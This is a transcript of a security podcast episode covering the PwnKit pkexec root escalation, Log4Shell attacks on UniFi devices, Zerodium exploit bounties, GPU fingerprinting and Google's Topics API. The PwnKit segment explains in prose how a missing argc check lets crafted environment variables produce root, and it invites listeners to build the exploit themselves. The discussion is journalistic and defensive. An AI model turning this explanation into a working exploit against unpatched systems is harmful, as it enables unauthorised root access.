Again, it is an attacker's dream come true.  It's been there since May of '09.  It works perfectly.  Proofs of concept appeared within three hours of Qualys's disclosure.  I mean, it's that easy to do.  In fact, I'm going to suggest that it's a perfect test yourself if you can invent an exploit from the description because it's not even that hard.



SANS Security Research wrote:  "We expect that the exploit will become public soon, and that attackers will start exploiting it.  This is especially dangerous for any multi-user system that allows shell access to users."  Yeah, right, because that's all you need.  And SANS' expectations, as I said, were realized less than three hours after Qualys published the technical details for what's being called "PwnKit."  I have a link to the C code of a reliable exploit at the end of this story.  But if you want to test yourself, don't look at it.  Anyway, we'll get there in a second.



The U.S.'s National Security Agency (NSA) Cybersecurity Director Rob Joyce noted on Twitter that the bug, he said, "has me concerned."  He said:  "Easy and reliable privilege escalation preinstalled on every major Linux distribution.  Patch ASAP or use the simple chmod 0755 with /usr/bin/pkexec mitigation."  So what he's saying there is fix your distro.  Or if for some reason you can't, then use the chmod command.  That 0755 sets the permissions to standard executable, not an SUID executable on that program.  And he said, he finished his tweet:  "There are working proofs of concept in the wild."



Okay.  So Polkit, which was formerly known as "PolicyKit," is a component used for controlling system-wide privileges in Unix-like operating systems, most popularly of course Linux.  The package is used for controlling, as I said, system-wide privileges.  The pkexec tool, which is a command line utility, is used to define which authorized user can execute a program as another user.  And that utility has a critical flaw.



Qualys security researchers rediscovered, and I'll explain that in a minute, the vulnerability, developed an exploit, and obtained full root privileges on default installations of Ubuntu, Debian, Fedora, and CentOS.  Others, if not all Linux distros, are likely vulnerable and are almost certainly exploitable.  Most sobering is that this vulnerability has been hiding in plain sight for more than 12 years.  It affects all versions of pkexec since its premiere release in May of 2009 when the miswritten pkexec command was first added to the PolicyKit.  I mentioned that Qualys rediscovered the vulnerability.  Again, I'll explain that in a second.



So as soon as Qualys's team had confirmed the vulnerability, they responsibly disclosed this glaring flaw back on November 18th and coordinated with all open source distributions to fix and then coordinate their announcement.  Qualys's disclosure - I provided a link in the show notes - provides the details of the coding error that has always been present in Polkit's pkexec command.  And, frankly, it's a little bit shocking.  In the C language, a command-line program receives two parameters from the operating system which is launching the program.  They're commonly known as, and in fact are, "argc" and "argv."  "C" is short for count, and "v" is short for vector, as in a one-dimensional vector array.  So argc is an integer count of the command-line parameters being passed to the program, and argv is a pointer to a vector array of pointers to strings.  Now, that sounds overly complicated when it's stated like that.  But it just means that argv points to a list where the various command-line argument strings can be found; and argc tells us how long that list is, how many string parameters are in the list.



The problem is, launching a program from a command line is only one of several ways for a Unix-like operating system to run a program.  It's entirely possible for the operating system to launch a program itself.  And in that case there's no actual command line, and the operating system can determine what parameters it wishes to provide to the spawned program, if any.  In other words, that list of parameters can be empty.  In that case, argc, the count of parameters, would be zero, and any properly designed parameter processing logic would know to skip that phase of the program's startup since there's no parameters to parse.



So guess what mistake the original author of pkexec made back in May of 2009?  He completely failed to take into account the possibility that pkexec, this very powerful program that always is run by the operating system as root, failed to take into account the possibility that pkexec might be started without any parameters.  He never checks to see whether argc is zero.  His code mistakenly assumes that parameters will always be present, so it doesn't check.  It just jumps right into dealing with the items in the nonexistent list of parameters.  Ouch.  And it turns out that mistake can be weaponized.  And when it is, it's 100% reliable and even cross-architecture, also working not only on x86 and x64 Intel architectures, but also ARM64 systems, as well, which was confirmed by the CERT Coordination Center's vulnerability analyst Will Dormann.



Red Hat described it this way.  They said:  "The current version of pkexec doesn't handle the calling parameters count correctly and ends up trying to execute environment variables as commands."  Which is a clue to how you exploit this puppy.  They said:  "An attacker can leverage this by crafting environment variables in such a way it'll induce pkexec to execute arbitrary code.  When successfully executed, the attack can cause a local privilege escalation giving unprivileged users administrative rights on the target machine."



Okay.  So, yikes.  Again, all Linuxes everywhere for the last 12 years trivially locally escalated a non-privileged user to root.  Since most major distributions have already released patches and updates, the best option now would be to install the patches for your version of Linux.  If that's not immediately feasible for any reason, or if there are no patches available for your particular distribution, as the NSA themselves mentioned, the vulnerability can be prevented from being exploited by removing the SUID bit from the pkexec utility's OS file privileges, and then verify that nothing important has broken by that change because maybe it was actually being used by your system.  So that can be done by using the chmod command with the "minus s" of "hyphen s" flag to remove the "s" privilege, or by following the NSA's chmod of 0755.  And anyone who doesn't know what any of that means doesn't need to worry about it because you shouldn't go there.  You should just update your Linux version.



For anyone who's interested in this sort of hack development, I really think this would be a perfect learning opportunity.  The Qualys disclosure provides beautiful technical details, deliberately stopping just short, because they didn't want to go all the way, I mean, they did themselves, they just didn't publish it, of providing a working proof of concept.  So perhaps take what Qualys provided and try your hand at turning that into a working exploit.  It's open source.  Qualys provides snippets.  Agh, you're showing the answer.



It's open source, and Qualys provides some, like, even highlights the high points, although anybody who is a C coder who's heard what I've said has already been rolling their eyes.  And you'll instantly see in the source where the problem is.  There is a well-written proof of concept, I mean, fully working exploit that is completely usable.  And I do have a link to the C code of it in the show notes.  But if you want to see if you can do this yourself, again, and if you've got some time, you like to play, here's a vulnerability that is just waiting to be exploited.  And the answer is also available.



And remember I mentioned it was rediscovered?  This is hard to believe, but Qualys was not the first to discover exactly this problem with Polkit's pkexec command.  It was originally discovered and blogged about in full by an Australian hacker living in Sydney by the name of Ryan Mallon.  And he blogged about it on December 16th of 2013.  So, yeah, what, eight years ago?  Or nine.



Ryan's WordPress blog post was titled "argv silliness."  And he wrote, he said:  "Most C programmers should be aware that the argv argument to main" - which is the master routine of any C program - "is a NULL terminated list of strings, where the first element is the name of the program.  On Linux there is an odd 'feature' [he has in quotes] which allows the list to be empty.  From the Linux execve man page" - and he cites it.  It reads:  "On Linux, argv can be specified as NULL, which has the same effect as specifying this argument as a pointer to a list containing a single NULL pointer."  It says:  "Do not take advantage of this misfeature.  It is non-standard and non-portable.  On most other Linux systems, doing this will result in an error."  And it says "(EFAULT)."



So then Ryan continues:  "This allows us to execute an application with argv[0]" - meaning the zero with array of the element - "equals NULL.  Many applications, including several setuid applications, make the assumption that argv[0] is always a valid pointer.  While I haven't found any potential exploits using this, it does allow for some amusing behavior from setuid binaries."  And then he goes into some further detail.  And then he actually landed and talked about the same exploitable.  He wrote:  "After searching around on a stock Ubuntu system for setuid binaries that looked promising for passing argv[0] == NULL, I found pkexec.  Pkexec is part of the Polkit package, which allows a binary to be executed as another user, similar to sudo.  We call execve" - and that's a Linux API used to programmatically execute another program - "passing an empty argv list and a single dummy environment variable."  And then he goes on.



So anyway, it was originally discovered.  Ryan blogged it.  He explained it completely.  He didn't go to the trouble of weaponizing it.  But then it sat there until late last year, when Qualys also discovered it.  And being security people, like very capable security people, they said, oh, we know how to weaponize this.  And they did.  And now everybody has it.  So we have another example of Bruce Schneier's sage observation that "Attacks never get worse, they only ever get better."  And this one was a doozy.



So again, not remotely exploitable.  Bad guys in China or Russia or whatever foreign country can't get into your machines this way.  But if anything is unprivileged on your machine, and untrusted, and you haven't fixed this, I mean, it's already, like it's instantly jumped into the attacker's toolkit.  If they ever find themselves on a Linux machine, the first thing they're going to try to do is see whether they can use this hack to elevate their privileges to root.  So you want to make sure that any systems that you're responsible for have been updated to fix this.  I mean, it was such a simple thing to fix.  But it's been broken for a long time.



JASON:  And discovered so long ago.  Poor Ryan.



STEVE:  Yes.



JASON:  Ryan blogged about it like, hey, everybody, check this out.  Can you believe what I found?  Crickets.  Crickets.  I mean, I'm looking on the post and, like, any of the comments have happened in the last few days.  Like obviously no one came across this post and really, you know what I mean?



STEVE:  Right.



JASON:  Or if they did, they didn't mention anything about it because, hey, let's keep this hidden, keep this a secret.



STEVE:  And one wonders, doesn't one.



JASON:  Yeah.



STEVE:  It's like, you know, did the NSA say, yeah, this is handy?  Let's use that.



JASON:  Yeah, right.



STEVE:  And then as soon as the world finds out about it, oh, turn it off, turn it off.



JASON:  I don't know, we'd better get rid of it.  Yup, yeah, totally.



STEVE:  Yeah.



JASON:  Who the heck knows?  Anyway, it's good on you, Ryan.  All right.  Log4Shell, Log4j, this is the topic that never goes away.  I didn't mean for that to rhyme.  It works.



STEVE:  So what I'm wondering, Jason, you know, SN30?  What happens if you use the code SN50?  Do you get a...



JASON:  You know, I doubt it does any.  I don't actually know.  I doubt it does anything.  And the only reason I doubt that is because very often or very many times in my life when I see a coupon code, I plug them in and see if they work; you know?  And I would say 99.9% of the time they don't when you change the number.  People are smarter than that.



STEVE:  Actually, SN99.9, that would be a bargain because it's 99.9% off.



JASON:  Right.  SN100.  



STEVE:  I don't think it works.



JASON:  I don't think it works.



STEVE:  Oh, that'd be even better, wouldn't it.  SN100, yeah.  It's free.  Okay.  So, yes, you're right, Log4j, oh my god.  Okay.  So there is some good news, though.  The expected avalanche of Log4j attacks have at least so far failed to materialize.  And we know why now.  It turns out that the reason is that most lower level attackers are looking for out-of-the-box, drop-in, ready-to-run code.  They're not interested in doing a lot of work.  And a lot of them can't; right?  They're script kiddies.  They can run a script, and they can use code that somebody else created.  But creating it themselves is above their pay grade.



And what's been seen is that for practical exploits to be created using the Log4j/Log4Shell vulnerabilities it requires customization.  The Log4j library was implemented differently by each app that used it.  So there turned out was no universally applicable exploit code that worked everywhere, out of the box, for everyone.  Which would grant attackers the ability to take over systems indiscriminately.  Log4j created an opportunity, but it didn't completely provide the means.  And it turns out that's all it takes to slow the attacks way down.



But we are seeing some instances of Log4j's use in attacks.  As we know, attempts have been made against VMware Horizon, VMware vCenter, Zyxel routers we talked about last week, and SolarWinds Serv-U servers we also talked about last week.  And now the security firm Morphisec has spotted attacks using a customized public exploit - again, you've got to customize them in order to get them to work - for the Log4Shell vulnerability to attack and take over Ubiquiti network appliances which are running the UniFi software.



The first active exploitation was seen a little over two weeks ago on January 20th using a proof-of-concept exploit which had been previously shared on GitHub.  That proof of concept was developed by a group called Sprocket Security to adapt the Log4Shell exploit specifically to work against Ubiquiti's UniFi devices, and it included complete post-exploitation steps.  In other words, this Sprocket Security group did all the hard work.  Don't ask me why Sprocket Security would develop and publicly post such a thing.  I mean, it's the height of irresponsibility.  But that's apparently what these guys do, and not just once.



On December 21st they published a blog posting on their site, a blog post titled:  "How to exploit Log4j vulnerabilities in VMware vCenter."  And their posting begins:  "A vulnerability was recently disclosed for the Java logging library, Log4j."  Yeah, no kidding.  "The vulnerability is wide-reaching and affects both open source projects and enterprise software, meaning we need to understand how to ID and remediate it in our network environments."  They said:  "Shortly after the issue was disclosed, VMware announced that several of their products were affected.  A proof of concept," they said, "has been released for VMware vCenter Server instances and explains how this vulnerability allows attackers to execute code as an unauthenticated user using a single HTTP request."



A week later on December 28th they published a blog titled "Another Log4j on the Fire:  Unifi."  And their posting begins:  "By now, you're probably well aware of a recently disclosed vulnerability for the Java logging library Log4j.  The vulnerability is wide-reaching and affects Ubiquiti's Unifi Network Application.  In this article, we're going to break down the exploitation process and touch on some post-exploitation methods for leveraging access to the underlying operating system."  They published, like, everything you need to know.



On January 10th they published:  "Crossing the Log4j Horizon - A Vulnerability With No Return," which begins:  "In this article, we're going to exploit Log4j vulnerabilities in VMware Horizon" - yeah, why not? - "get a reverse shell, and leverage our access to gain a backdoor to the VMBlastSG framework.  We have also made available a GitHub repository that automates the exploitation process."



Okay.  These guys, I don't want to say they're evil, but their heart's in the wrong place.  I mean, they are - okay, sure.  Patches exist.  But they're not waiting very long before they publish full exploit instructions.  And that's what the people who aren't able to do it themselves need.  That was what Log4j and Log4Shell was missing was per-instance exploitation guides and code.  And these Sprocket people are providing it.  They're a penetration testing firm.  So I can understand their need to deeply understand the Log4j vulnerability for their own purposes to protect their customers.  But it presents nothing other than harm done to the industry for them to publicly post fully working exploit code which is, and I just made up the initials SKR, stands for Script Kiddie Ready.  And this stuff is SKR.



As we know, Ubiquiti Networks is a very large hardware vendor.  Their UniFi software can be installed on Linux and Windows servers to allow network admins to manage Ubiquiti wireless and networking equipment from a centralized web-based application. In order to be cross-platform, UniFi was built with, yes, Java, and utilizes naturally the Log4j library for its logging.  It was listed as impacted by the Log4Shell vulnerability and was quickly patched back on December 10th, just one day after the Log4Shell news became public.  In other words, Ubiquiti was super responsible.  They jumped on this immediately and had it patched pronto.  Yet that doesn't mean, as we know, there's a gap between the availability of the patches and their deployment.  Those are two different things.



Sprocket Security published its adaptation of the Log4Shell attack for UniFi devices in late December.  And Morphisec began seeing attacks starting on January 20th.  Morphisec said the attackers took over UniFi devices and ran malicious PowerShell code that later downloaded and installed a version of the Cobalt Strike Beacon backdoor, which we talked about a number of podcasts back, that is, about Cobalt Strike.  We talked about it extensively.  And researchers noted that this malware communicated with a command-and-control server that was previously seen attacking SolarWinds Serv-U servers prior to the Log4Shell attacks.



So Log4j and Log4Shell are obviously real.  We can be thankful that the exploitation created by Log4j's deliberate URL resolution and dereferencing is tricky and highly application dependent.  So no one-size-attacks-all exploit is feasible.  But helping the bad guys to attack those who have not yet patched, and not even waiting 60 or 90 days, to me seems the height of irresponsibility.  So bad on you, Sprocket people.  You shouldn't be telling the script kiddies how to do this.  We know you know.  You're protecting your customers.  Wait a while.



Okay.  Zerodium.  So much is wrong with this picture.  Last Thursday, January 27th, Zerodium added two new entries to what they're calling their "Limited-Time Bug Bounties," in this case for Microsoft's Outlook and Mozilla's Thunderbird.  This brings the total of currently active "Temporary Bug Bounties" to three, since Outlook and Thunderbird are joining the longstanding "WordPress Pre-Auth RCE" which became active on March 31st of last year and remains so today.  So until last Thursday, a special bounty for WordPress Pre-Auth RCEs, remote code executions, was all by itself.



That WordPress offer explains.  They said:  "We are temporarily" - this was as of March 31st.  "We are temporarily increasing our payout for WordPress RCEs from $100,000 to $300,000.  We're looking for pre-authentication exploits affecting recent versions of WordPress.  The exploit should allow remote code execution, work with default installations, and should not require any authentication or user interaction."  Yeah.  Thank god they're still asking because that sort of presumes that maybe no one's come up with one yet.



So the good news is, for most of the sites using WordPress today, and as we've been, you know, we've been talking about WordPress a lot because unfortunately the add-ons are a security disaster.  But as evidenced by this longstanding and presumably still unfilled offer, the base WordPress is quite secure.  It's WordPress's unprofessionally written, just written by anybody, add-ons that are the source of all of the havoc that we're talking about relative to WordPress almost on a weekly basis.  I mean, a lot last year.  And remote code executions involving, you know, RCE vulnerabilities involving add-ons do not qualify for this special limited-time offer, $300,000 being put up by Zerodium.



Okay.  Now, there have been a number of previous limited-time offer bug bounties posted by Zerodium.  Chrome had an offer for a remote code execution vulnerability which was active from the 14th of September last year through the end of the year.  Of that one, Zerodium said:  "We are looking for remote code execution exploits affecting Google Chrome.  The exploit should work with Chrome for Android, Windows, Linux, and macOS, and support both 32-bit and 64-bit architectures.  Full chains with remote code execution and sandbox escape are eligible for a $1,000,000 bounty."  You know, and again, the reason this all bugs me is they're going to sell this to somebody who's going to use this to attack people, not somebody who's going to fix Chrome.



Other previous and since expired bounties have been offered for a simple Chrome Sandbox escape, and also for exploits against VMware vCenter, Pidgin, ISPConfig, Moodle, IceWarp, SAP NetWeaver, and VMware's ESXi.  Since a few of these are moderately obscure - Moodle and IceWarp? - as we have in the past, we'd conjecture that some specific client of Zerodium has offered to pay a pretty penny for an exploit against one of these non-mainstream packages.  So a special offer was required to focus some researcher attention over in that direction.



So today, now, as of last Thursday, Zerodium is targeting two of today's most popular and widely used email clients with no ending date specified in either of the cases.  For Outlook they said:  "We are temporarily increasing our payout for Microsoft Outlook remote code execution vulnerabilities from $250,000 to $400,000.  We're looking for zero-click exploits leading to remote code execution when receiving/downloading emails in Outlook, without requiring any user interaction such as reading the malicious email message or opening an attachment.  Exploits relying on opening/reading an email may be acquired for a lower reward."  And I love the term "reward."  Yeah, you're getting a reward.



For Thunderbird, for which, unlike for Outlook, they had not been offering any standing bounty before, they're now offering $200,000 with the explanation:  "We are looking for" - and essentially the same thing - "zero-click exploits affecting Thunderbird and leading to remote code execution when receiving/downloading emails," blah blah blah.  Similar, if you have to look at it or download an attachment, read the email, then we'll still consider paying you something, but we're going to get less excited, as will our client.  So we're not paying you $200,000 for that one.



So, you know, if Zerodium were a beneficent entity working to powerfully incentivize hackers to find the worst of the worst exploits for the purpose of then responsibly disclosing those discoveries to their publishers, I would think this was amazing.  But we know what Zerodium is doing.  They're a for-profit Washington D.C.-based enterprise, and they're not even like hiding somewhere, which resells these "rewarding discoveries" to their private, state-based clientele.  And those discoveries are then used in targeted attacks against others, in direct violation of all cybercrime laws everywhere, including the laws of the countries who are using these to attack people.



I suppose the creation of Zerodium was inevitable.  Wikipedia reports that they pull from a pool of around 1,500 researchers and that, since their founding in 2015, more than $50 million has been paid out in so-called "reward" bounties.  So I'm glad that there are other legitimate channels for reporting and being paid for such discoveries - Pwn2Own, HackerOne, you know, good guys, the Zero-Day Initiative, Trend Micro ZDI - where those discoveries, when responsibly disclosed, will be used to repair the affected software rather than to attack unsuspecting and often innocent people, typically journalists, dissidents, and other "enemies of the state."  But it is what it is.  And now they're asking for, hope to find really horrible bugs in Outlook and Thunderbird, which is what a payment for that reward would be.



Okay.  They called it "DRAWNAPART."  In yet another discovery which can be employed by a web browser's JavaScript, a team of researchers from Australia, France, and Israel - including a bunch from the always-industrious Ben-Gurion University of the Negev, we've spoken of them many times in the past - they've successfully demonstrated yet another brand new fingerprinting technique, this time exploiting a machine's GPU, its graphics processing unit, as a means to track users across the web persistently, or in their case to dramatically increase the potency of existing tracking.



The abstract for their paper explains this, so I'm just going to share it.  They said:  "Browser fingerprinting aims to identify users or their devices through scripts that execute in the user's browser and collect information on software or hardware characteristics.  It is used to track users or as an additional means of identification to improve security."  Yeah, I wish.  "Fingerprinting techniques have one significant limitation.  They're unable to track individual users for an extended duration.  This happens because browser fingerprints evolve over time, and these evolutions ultimately cause a fingerprint to be confused with those from other devices sharing similar hardware and software.



"In this paper we report on a new technique that can significantly extend the tracking time of fingerprint-based tracking methods.  Our technique, which we call DRAWNAPART, is a new GPU - that's drawn; right? - a new GPU fingerprinting technique that identifies a device from the unique properties of its GPU stack.  Specifically, we show that variations in speed among the multiple execution units that comprise a GPU can serve as a reliable and robust device signature, which can be collected using unprivileged JavaScript.  We investigate the accuracy of DRAWNAPART under two scenarios.



"In the first scenario, our controlled experiments confirm that the technique is effective in distinguishing devices with similar hardware and software configurations, even when they are considered identical by current state-of-the-art fingerprinting algorithms."  In other words, they look more closely somehow and find a difference.



"In the second scenario, we integrate a one-shot learning version of our technique into a state-of-the-art browser fingerprint tracking algorithm.  We verify our technique through a large-scale experiment involving data collected from over 2,500 crowd-sourced devices over a period of several months and show it provides a boost of up to 67% to the median tracking duration, compared to the state-of-the-art method."



And they conclude their abstract explaining:  "DRAWNAPART makes two contributions to the state of the art in browser fingerprinting.  On the conceptual front, it is the first work that explores the manufacturing differences between identical GPUs" - okay, listen to that - "the manufacturing differences between identical GPUs, and the first to exploit these differences in a privacy context.  On the practical front, it demonstrates a robust technique for distinguishing between machines with identical hardware and software configurations, a technique that delivers practical accuracy gains in a realistic setting."



Okay.  So one of the ways we're succeeding as an industry in increasing overall performance is by creating parallel symmetric computation units.  This is what the "cores" are in a multicore system.  Not always completely symmetric.  There are settings where performance and power consumption must be dynamically traded off.  So we're seeing the development of heterogeneous rather than homogeneous architectures where, for example, a multicore processor might be deliberately composed of a mix of lower power and leaner processor cores which efficiently putt along when not much is happening, and some higher power cores which can be brought to bear only when and as if needed in order to optimize power consumption.



But in the case of GPUs, where there's a team of intended to be identical execution units, one of the coolest things this team did was to exploit today's increasingly parallel approach to set up a deliberate race condition among all available processors, then to monitor the exact sequence of their completion of that race.  It turned out that although all of a GPU's execution units are designed to be identical, in fact they are not, and the exact sequence they finished is stable for any given GPU and different among GPUs.  That's the definition of a fingerprint.



They end their paper by discussing responsible disclosure, even though what they found wasn't a bug.  Well, not exactly.  They wrote:  "We shared a preliminary draft of our paper with Intel, ARM, Google, Mozilla, and Brave during June to July of 2020" - so they've been working on this for a while - "and continued sharing our progress with them throughout 2020 and 2021.  In response to the disclosure, the Khronos group responsible for the WebGL specification has established a technical study group to discuss the disclosure with browser vendors and browser stakeholders."



So that's what you want.  Clearly, this GPU fingerprinting is being taken seriously.  It is a means for, with some granularity, it's not going to identify, because there just aren't enough execution units in the typical GPU, it's not going to uniquely identify one GPU in the world the way a MAC address can.  But it obviously is powerful enough to increase the strength of fingerprinting when incorporated.  So this working group, working on WebGL, is going to see about making JavaScript less able to do that because it's able to right now.  



Okay.  We will get to Google's Topics in a moment.  I wanted to share something, though, with our listeners, which is completely random, a random tip that I wanted to share when I finally went googling and found a solution to something that's been a persistent annoyance of mine for years.  And here it is.  When using Windows File Explorer, I have always preferred sorting the listing of files by date, with the most recently modified files at the top.  That means that when you go to a folder, the listing you see is sorted by date with most recent first because that probably is the file you're looking for, or that you or something has most recently been using.



So that's the way I have always been sorting things.  And if I'm in Unix, the command there, I'll do an "ll -rt" telling that I want a listing, and the "rt" stands for reverse time.  And that means that it pulls the most recently changed files to the bottom of the list, where the list might have otherwise scrolled off the top of the screen, thus placing the files that are most recent changed right near where I am.  But in Windows, since the default usually shows the top of the list when I jump to a folder, what I want is the most recently changed files to appear at the top.  So I sort by date.



The problem that's been bugging me for years has always been that this places any subdirectories, or we're supposed to call them folders now, at the bottom, which is really annoying when I'm trying to traverse down a hierarchy.  And yes, I could expand the tree hierarchy in the left pane.  But what I wanted was the files sorted by date, with the most recent file folders at the top - well, the files at the top and the folders also at the top.



Anyway, a bit of googling provided the answer.  After clicking on the "Date" header to get the little arrow pointing down, so now you've got everything sorted by date, hold the SHIFT key down and click the "Name" header.  Presto.  I now have folders at the top because the name is the second sort.  And the folders themselves are sorted from newest to oldest, based on the age of their content.  And that's followed by files sorted from most to least recent.  And then of course I made that the global default for my desktops by looking under the "Organize" menu and selecting "Folder and Search" options.  I first hit reset to clear any previous sorting overrides and then "Apply to Folders," meaning that I want the sort order that I just set to apply system wide.



So anyway, maybe this is dumb, and everyone already knew this, and I was the last one to find out.  But I am so much happier now, and I wanted to share my little discovery with everyone else just in case it might be useful to you.



JASON:  There's at least a few people in the IRC chat who are happy that you did that.



STEVE:  Oh, yay.



JASON:  Whether people know this exists or not, you know?  It's like somebody out there has the same issue.



STEVE:  I figured.  That's why I wanted to share it.



JASON:  Yeah, exactly.



STEVE:  It's been niggling at me, and I just never - like I was annoyed, but I didn't take the time.  



JASON:  Right.



STEVE:  Until a couple days ago.  And I thought, okay, wait, let me just - has anybody else addressed this?  And it turns out, oh, yeah, yeah.  But, boy, it's so nice.  I'm just like, okay, why didn't I do this two years ago or whenever?



JASON:  Exactly, exactly.



STEVE:  Anyway, we've got a couple of closing-the-loop bits from our listeners.  Igor Lima tweeted me.  And these were all public tweets, so I'm sharing everyone's name.  I don't do that, as you know, in DMs just because I don't have your permission.  He said:  "Really appreciate your explanation of buffer overflows, Steve.  These detailed walkthroughs are a main reason I tune in every week.  Would love to hear an explanation of how someone could translate such a vulnerability into an RCE.  All the best."



Well, as it happens, that was what happened this week with that PwnKit.  It is a beautiful example, one example of how to translate this sort of problem into an RCE.  So there's proof-of-concept source code.  There's lots of information in several people who have explained it.  So it's there for the taking.



Someone tweeting from Hiveware actually sent it to @GibsonResearch, that's another Twitter account I have, said:  "@GibsonResearch.  After listening about the NetUSB vulnerability" - and that was what we talked about last week.  He said:  "I checked my own engine code and found the same oversight.  Easy to fix now.  A nightmare when the code is in the field.  Thanks for saving the day with your podcast."  And his name actually is Robert Tischer.



So Robert, that's very cool.  Basically the problem was a transmission to NetUSB sent the length of what was to follow.  And that's not a problem except that the code was allocating some additional buffer space for its own use.  So if you sent the maximum possible value that could be represented for 32 bits and then to that was added the additional bytes, that would overflow the maximum possible 32-bit value, creating a small allocation rather than a big one.  So then when you sent whatever amount of data you wanted to, you'd immediately overflow the buffer.  So it was such an elegant flaw that I wanted to share it with our listeners.  And I've had a lot of positive feedback from people.  I'm getting a little less nervous about getting down into the weeds.  Our listeners apparently like it.



Brandt Krueger said:  "@SGgrc.  Worried that the authenticator app I've loved and used forever may no longer be being supported by the dev.  No updates in years, and not responding to support requests.  Is there a way to translate codes back into QRs so they can be scanned into a new Auth app?"  And the answer fortunately is a big no.  You wouldn't want that.  Nobody would want that because that would allow the codes being generated to be reverse-engineered into the secret key, and it's only that key's secrecy that allows the sequence of those codes to be unpredictable.  Basically it is a deliberately information-lossy hash which produces those six-character codes, or nine-character codes, however many characters, yeah, nine.  And it's meant not to be reversible.



So this is why what I have always done, and I have always recommended, is right when you are setting up two-factor authentication, and the QR code is on the screen, and you're being told by the website to show this to your phone, I print the page.  And I literally have a sheaf of printed pages which are all the QR codes of every account for which - and I always use it, so I use OAuth, or, no, OTH is the app.  I love it.  It allows cloud sync, so my various i-devices are synchronized.  I'm not sure if it allows an export.  You might, after you go through all the trouble of moving to a different auth app, see if it has an export feature.  There are some that do.



But ultimately the way to solve the problem is, again, the only way you're going to be able to move is by going to every place where you're currently authenticated and tell them you need to change your authentication.  They will give you a QR code.  This time hit CTRL-P for print and make a paper copy.  You're going to want to obviously store those in a safe place.  That's an offline safety problem and is easily solved.  But no way to use the codes.  



JASON:  I'm curious to know what authenticator app that is, just for other people to know also that it's not being supported.



STEVE:  Yeah, it's no longer supported, yeah.  Itinerant Engineer tweeted:  "I know how to estimate," he said, "the entropy in a string of randomly chosen characters," he said, "for example, 20 characters is 128 bits.  But how do you estimate the entropy of a string of randomly chosen words, such as 'correct horse battery staple'?"  He says:  "Bitwarden offers passphrases without telling the size of the dictionary."  And he signed off "Lance."



Okay.  So that's a good problem.  It is absolutely necessary for you to know the size of the dictionary so that you know the number of objects from which each of those four words was chosen.  And then of course you take that number times the number of words, in this case four, so it's that number to the power of four are the total number of possible strings.



Now, a very favorite trick of mine to determine the equivalent entropy in bits is to take that total number of items, whatever it is.  So it's, again, the size of the dictionary, say that there were 50 possible words.  So 50 x 50 x 50 x 50.  That is, if there were four words in the string.  So 50 raised to the power of four.  You then take the natural log of that and divide it by the natural log of two.  And the result is the number of binary bits equivalent of that number of things.  And you could use the log base 10 if you wanted to, just you need to use the same one.  I like the natural log.



So the natural log of the number of items over the natural log of two equals the equivalent number of binary bits.  So it's very cool.  And you'll get something like, I think, I tried it last night, 10,000 was 13 point something or other.  So you won't get, unless you did 1024 or 16384, then you'd get an exact integer when you took the natural log of that over the natural log of two.  But anyway, just a cute trick that I've often used for various things.



JASON:  And just to mention real quick here, before you more on, Bitwarden, full disclosure, they are a sponsor on the network.  Got to get that in there.



STEVE:  Oh, yes, right.  Thank you.



JASON:  Yeah, you bet.



STEVE:  And we're glad they are.



JASON:  Absolutely.



STEVE:  Okay.  Lastly, in my continuing efforts to give this next release of SpinRite every possible useful capability, I've recently been spending some time dealing with mass storage adapters that declare themselves to be RAID controllers so as not to be seen as standard IDE, ATA, or AHCI controllers.  They typically provide their own firmware to talk to their hardware.  And I could have SpinRite ignore the possibility of natively handling the drives attached to those nonstandard controllers, just calling upon their firmware to deal with their drives.  But SpinRite is able to do a much better job with data recovery and maintenance when it's able to directly access the drive's hardware registers, since that gives SpinRite a much better sense for what's going on in the drive.



And in most all cases, I mean, I'm tempted to say in almost all cases, except where a controller really is offering native RAID services, and high-end controllers do actually do RAID, the chipset is actually a third-party chip by a well-known company:  ASMedia, JMicron, Marvell, or Silicon Image, all of which I've seen, all of which SpinRite knows how to talk to directly, and all of which present recognizable registers.  So now SpinRite is able to work directly with those chips.  That is, it ignores the RAID claim on the PCI bus and looks past it to see if the registers are recognizable to it, in which case it makes sure it's able to use them, and then it does.  It flags that drive as directly accessible.



And SpinRite seems to be about twice as fast in transferring large blocks of data as the AHCI firmware is on motherboards or add-on adapters.  I mean, it screams.  But in my testing I've encountered a few instances where SpinRite appears to be a bit slower when talking to bus mastering DMA hardware.  I don't know why.  The firmware for those adapters may be using some proprietary tricks to get additional speed from them.  And since speed is a crucial factor for SpinRite's operation, because it's literally working on the entire drive, I need to always use the fastest access method, even if it's not my own.  And that means that SpinRite needs to know which approach will be the fastest.



So I'm in the final throes of incorporating a mini-benchmark into SpinRite's initial system appraisal, where it locates all of the mass storage attached to a system and works out the best way to talk to each of its drives, not only for the direct register access for doing data recovery and maintenance, but also what's the best way for getting as much data read at once while looking for problems.  And that may well be the firmware that came with the controller, rather than SpinRite's own code.  So anyway, a little update on where I am.  And Jason, obviously I'm getting a little hoarse here.



JASON:  Take a drink.



STEVE:  I'm going to take a sip of water, and then we will talk about Google's Topics API.



JASON:  I'm really looking forward to that.  You know what, take a couple of sips.  It's cool, we've got time.  Three or four.  The whole bottle.  All right.  We've been hearing all about the decision, Google's decision to move away from FLoC, and the replacement being Topics.  And of course everybody is like,  well, we didn't like FLoC for certain reasons.  Are those same reasons evident in the transition to the Topics API?  So I'm really curious to hear what you have to say about this, Steve. 



STEVE:  So after the rather spectacular shunning and failure of Google's FLoC proposal, which we know, their Federated Learning of Cohorts, which as I said wasn't actually federated learning, last week Google unveiled their proposed replacement solution for identifying the real world interests of web browser users for the purpose of presenting more interesting and appropriate ads as a means for increasing click-through rates and thus increasing advertising revenue.



And I know that on Sunday Leo discussed Topics just sort of broadly with his panel and noted that the TWiT network is supported by advertising.  We know that many websites are supported by advertising.  So it's not just Google, the behemoth, that's giving us all a lot of free services which actually are supported by advertising, but the people who host the ads on their websites are receiving revenue flow, too.  So if the ads are more effective, they get more money.  They get more revenue.  So the idea is I think it's really necessary to separate the bad idea of tracking from the good idea of more relevant ads, of ad targeting.  And the people on the panel Sunday all agreed that, like, okay, if we're going to have to have ads, wouldn't it be better if they were useful to us, rather than just being absolutely insane noise?  So, yeah.  



Google listened to everything that people had problems with with FLoC, and I think they've learned.  Topics bears no relationship, no resemblance to FLoC.  I mean, it came from another planet entirely.  It's a new proposal, and it attempts to address every reasonable complaint that has been lodged against all previous proposals.



